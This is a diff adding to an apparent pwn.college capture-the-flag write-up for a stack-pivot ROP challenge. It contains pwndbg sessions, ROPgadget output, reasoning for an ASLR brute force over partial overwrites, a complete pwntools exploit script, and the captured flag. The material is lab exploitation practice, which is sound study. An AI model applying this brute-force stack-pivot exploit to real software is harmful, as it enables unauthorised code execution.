@@ -11317,13 +11317,15 @@ hacker@return-oriented-programming~pivotal-pursuit-hard:~$ /challenge/pivotal-pu
 [LEAK] Your input buffer is located at: 0x7fffaae11c88.
 ```
 
+Since location of the pointer to `win()` is before our buffer, we will have to perform a stack pivot so that our ROP chain executes the `win()` function.
+
 We need the following:
 
 - [ ] Offset between the location of the buffer and the location of the stored return pointer
 - [ ] LSB of required ROP gadgets
 - [ ] Offset of the overwritten stored base pointer value from the buffer
 
-### Binary analysis
+### Binary Analysis
 
 #### `main()`
 
@@ -11433,7 +11435,7 @@ Breakpoint 1 at 0x2258
 pwndbg> run
 Starting program: /challenge/pivotal-pursuit-hard 
 Downloading separate debug info for system-supplied DSO at 0x7ffdc2db5000
-Download failed: Invalid argument.  Continuing without separate debug info for system-supplied DSO at 0x7ffdc2db5000.                                                                           
+Download failed: Invalid argument.  Continuing without separate debug info for system-supplied DSO at 0x7ffdc2db5000.
 ###
 ### Welcome to /challenge/pivotal-pursuit-hard!
 ###
@@ -11497,3 +11499,154 @@ Breakpoint hit at 0x564274d9d258
 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ```
 
+- [x] Offset between the location of the buffer and the location of the stored return pointer: `80`
+   - Location of the buffer: `0x7ffdc2d2b198`
+- [ ] Locations of required ROP gadgets
+- [ ] Offset of the overwritten stored base pointer value from the buffer
+
+```
+pwndbg> info frame
+Stack level 0, frame at 0x7ffdc2d2b1f0:
+ rip = 0x564274d9d258 in main; saved rip = 0x7f5efdcc1083
+ called by frame at 0x7ffdc2d2b2c0
+ Arglist at 0x7ffdc2d2b1e0, args: 
+ Locals at 0x7ffdc2d2b1e0, Previous frame's sp is 0x7ffdc2d2b1f0
+ Saved registers:
+  rbp at 0x7ffdc2d2b1e0, rip at 0x7ffdc2d2b1e8
+```
+
+```
+pwndbg> p/d 0x7ffdc2d2b1e8 - 0x7ffdc2d2b198
+$1 = 80
+```
+
+- [x] Offset between the location of the buffer and the location of the stored return pointer: `80`
+   - Location of the buffer: `0x7ffdc2d2b198`
+   - Location of the stored return pointer: `0x7ffdc2d2b1e8`
+- [ ] Locations of required ROP gadgets
+- [ ] Offset of the overwritten stored base pointer value from the buffer
+
+#### ROP gadgets
+
+The challenge has ASLR enabled, which means that the addresses of the ROP gadgets would be different save the 3 least significant nibbles. If we decide to do partial overwrite, that will require brute forcing.
+
+We are looking for a specific gadget `leave ; ret` which pops the value of `rbp` into `rsp`. So in our chain, if we replace the stored base pointer with the address somewhere above that of the pointer to `win()`, our stack pointer would be moved to that location above the pointer to `win()`. This would be our stack pivot.
+
+We know that the `leave ; ret` instructions are at the epilogue of every function. We also know where this gadget is in the `main()` function:
+
+```
+pwndbg> disassemble main
+Dump of assembler code for function main:
+
+# ---- snip ----
+
+   0x0000564274d9d27e <+423>:   leave
+   0x0000564274d9d27f <+424>:   ret
+End of assembler dump.
+```
+
+Now let's take a look at the stored return pointer.
+
+```
+pwndbg> x/gx 0x7ffdc2d2b1e8
+0x7ffdc2d2b1e8: 0x00007f5efdcc1083
+```
+
+```
+hacker@return-oriented-programming~pivotal-pursuit-hard:~$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --rop | grep "leave ; ret"
+0x00000000000c7aa1 : add al, 0xe8 ; leave ; ret 0xfff6
+0x000000000012d2f2 : add byte ptr [rax], al ; jne 0x12d3cd ; leave ; ret
+0x00000000000578c0 : add byte ptr [rax], al ; jne 0x57945 ; leave ; ret
+0x00000000000e3664 : add byte ptr [rax], al ; jne 0xe36a9 ; mov rbx, qword ptr [rbp - 8] ; leave ; ret
+0x00000000000e3834 : add byte ptr [rax], al ; jne 0xe3879 ; mov rbx, qword ptr [rbp - 8] ; leave ; ret
+0x00000000000578c6 : add byte ptr [rax], al ; leave ; ret
+0x00000000000e3665 : add byte ptr [rbp + 0x41], dh ; mov rbx, qword ptr [rbp - 8] ; leave ; ret
+0x00000000000578c1 : add byte ptr [rdi], cl ; test dword ptr [rbp], edi ; add byte ptr [rax], al ; leave ; ret
+0x00000000000e366b : clc ; leave ; ret
+0x00000000000578c4 : jge 0x578c6 ; add byte ptr [rax], al ; leave ; ret
+0x000000000012d2f4 : jne 0x12d3cd ; leave ; ret
+0x00000000000578c2 : jne 0x57945 ; leave ; ret
+0x00000000000e3666 : jne 0xe36a9 ; mov rbx, qword ptr [rbp - 8] ; leave ; ret
+0x00000000000e3836 : jne 0xe3879 ; mov rbx, qword ptr [rbp - 8] ; leave ; ret
+0x00000000000578c8 : leave ; ret
+0x00000000000c7aa3 : leave ; ret 0xfff6
+0x00000000000e3669 : mov ebx, dword ptr [rbp - 8] ; leave ; ret
+0x00000000000e3668 : mov rbx, qword ptr [rbp - 8] ; leave ; ret
+0x00000000000e366a : pop rbp ; clc ; leave ; ret
+0x00000000000c7aa0 : pop rdi ; add al, 0xe8 ; leave ; ret 0xfff6
+0x000000000012d2f6 : rol dword ptr [rax], cl ; add byte ptr [rax], al ; leave ; ret
+0x00000000000578c3 : test dword ptr [rbp], edi ; add byte ptr [rax], al ; leave ; ret
+```
+
+The saved RIP is `0x7f5efdcc1083` (`__libc_start_main+243`, libc offset `0x24083`). The `leave ; ret` gadget is at libc offset `0x578c8`. Since both the saved RIP and the gadget live within libc, a partial overwrite of the saved RIP stays within the same mapping.
+
+A **2-byte** overwrite locks byte 2 of the resulting address to `0xcc` (the current value in the saved RIP), which constrains which ASLR base values can ever succeed — only those where byte 2 of `libc_base + 0x578c8` happens to equal `0xcc`, roughly a 2/256 chance. A **3-byte** overwrite instead replaces the low 3 bytes of the saved RIP entirely, leaving the upper 5 bytes intact (same libc mapping), which is both correct and far more efficient.
+
+ASLR randomizes 28 bits of the libc base (bits 12–39). Since the base is always page-aligned (low 12 bits = `0x000`), the lower nibble of byte 1 of any libc gadget address is always `0x0`. This leaves **4 bits (upper nibble of byte 1) × 8 bits (byte 2) = 4096 possible 3-byte patterns** to enumerate.
+
+- [x] Offset between the location of the buffer and the location of the stored return pointer: `80`
+   - Location of the buffer: `0x7ffdc2d2b198`
+   - Location of the stored return pointer: `0x7ffdc2d2b1e8`
+- [x] Locations of required ROP gadgets: `leave ; ret` at libc offset `0x578c8` → 4096-way brute force
+- [x] Offset of the overwritten stored base pointer value from the buffer: `72` (we write `buf - 16`)
+
+### ROP chain: Stack pivot + ret2win
+
+The ROP chain would be the exact same as the [easy challenge](#rop-chain-stack-pivot--ret2win-4).
+
+### Brute Force Enumeration
+
+We enumerate all 4096 valid 3-byte patterns for `leave ; ret` at libc offset `0x578c8`. Each attempt spawns a fresh process (new ASLR roll), sends the payload, and checks stdout for `pwn.college{`. Expected attempts to first hit: ~4096.
+
+```python
+patterns = []
+for b2 in range(256):
+    for N in range(16):
+        val = (b2 * 0x10000 + N * 0x1000 + 0x578c8) & 0xFFFFFF
+        patterns.append(val.to_bytes(3, "little"))
+```
+
+### Exploit
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+import random
+
+context.arch = "amd64"
+context.log_level = "error"
+
+rip_offset = 80
+rbp_offset = rip_offset - 8
+
+patterns = []
+for b2 in range(256):
+    for N in range(16):
+        val = (b2 * 0x10000 + N * 0x1000 + 0x578c8) & 0xFFFFFF
+        patterns.append(val.to_bytes(3, "little"))
+random.shuffle(patterns)
+
+for pat in patterns * 20:
+    p = None
+    try:
+        p = process("/challenge/pivotal-pursuit-hard")
+        p.recvuntil(b"located at: ", timeout=5)
+        buf = int(p.recvline().strip().rstrip(b"."), 16)
+        p.send(b"A" * rbp_offset + p64(buf - 16) + pat)
+        out = p.recvall(timeout=2)
+        if b"pwn.college{" in out:
+            print(out.decode(errors="ignore"))
+            break
+    except Exception:
+        pass
+    finally:
+        if p:
+            try: p.close()
+            except: pass
+```
+
+```
+hacker@return-oriented-programming~pivotal-pursuit-hard:~$ python ~/script.py
+Leaving!
+### Goodbye!
+pwn.college{Ev46VWhcbN-YqygnU-Fiv_DrFf1.0FN2MDL4ITM0EzW}
+```
